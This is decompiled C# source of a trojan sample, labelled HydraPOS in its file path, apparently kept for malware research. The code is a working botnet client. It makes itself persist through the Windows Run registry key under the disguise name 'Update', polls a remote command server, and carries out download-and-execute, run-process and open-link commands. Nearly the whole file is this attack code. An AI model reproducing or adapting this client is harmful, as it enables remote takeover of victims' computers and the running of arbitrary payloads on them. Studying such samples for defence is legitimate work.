// Decompiled with JetBrains decompiler
// Type: botnet.Program
// Assembly: Update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D8465C02-421F-4971-8C0C-BE9248AC1EF7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.HydraPOS.gen-544910dbdbcb5b670dd592eb1913af579ba4bf01c1ae4b57f1fcdbcfc7500f6f.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Threading;

namespace botnet
{
  internal class Program
  {
    private static string last_cmd = string.Empty;

    private static void SetStartup() => Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("Update", (object) Assembly.GetExecutingAssembly().Location);

    private static void Main(string[] args)
    {
      while (true)
      {
        Program.SetStartup();
        try
        {
          string input_content = Regex.Match(web.GetHTML(configs.server), "<p>(.*)</p></article>").Groups[1].Value;
          if (Program.last_cmd == input_content)
          {
            Thread.Sleep(configs.delay);
          }
          else
          {
            Program.last_cmd = input_content;
            Program.Execute(new cmd(input_content));
            Thread.Sleep(configs.delay);
          }
        }
        catch
        {
        }
      }
    }

    private static void Execute(cmd CMD)
    {
      string comType = CMD.ComType;
      if (!(comType == "open_link"))
      {
        if (!(comType == "download_execute"))
        {
          if (!(comType == "run_process"))
          {
            if (!(comType == "exit"))
              return;
            Environment.Exit(0);
          }
          else
          {
            try
            {
              Process.Start(CMD.ComContent);
            }
            catch
            {
            }
          }
        }
        else
          functions.DownloadExecute(CMD.ComContent);
      }
      else
        functions.OpenLink(CMD.ComContent);
    }
  }
}
